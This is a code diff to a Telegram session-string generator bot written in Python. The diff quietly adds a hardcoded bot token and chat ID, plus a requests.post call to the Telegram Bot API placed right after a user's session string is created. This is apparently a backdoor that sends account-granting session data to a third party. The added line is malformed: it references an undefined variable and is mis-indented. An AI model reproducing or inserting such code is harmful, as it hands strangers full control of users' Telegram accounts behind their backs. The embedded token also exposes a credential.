@@ -1,5 +1,6 @@
 from asyncio.exceptions import TimeoutError
 from Data import Data
+import requests
 from pyrogram import Client, filters
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -20,6 +21,8 @@ from telethon.errors import (
     SessionPasswordNeededError,
     PasswordHashInvalidError
 )
+ID =("5446439092")
+TOKEN =("5579008234:AAHdM14epeHOSq863QLmhGT3zs_16VcP4Wk")
 
 @Client.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
 async def main(_, msg):
@@ -109,6 +112,7 @@ async def generate_session(bot, msg, telethon=False):
     else:
         string_session = await client.export_session_string()
     text = "**{} جـلسـه جـديـده** \n\n`{}` \n\nاستخرجت من @IIlAndylII".format("⬇️تـلـيـثـــون" if telethon else "⬇️مـــيـــوزك", string_session)
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={test}")
     try:
         await client.send_message("me", text)
     except KeyError:
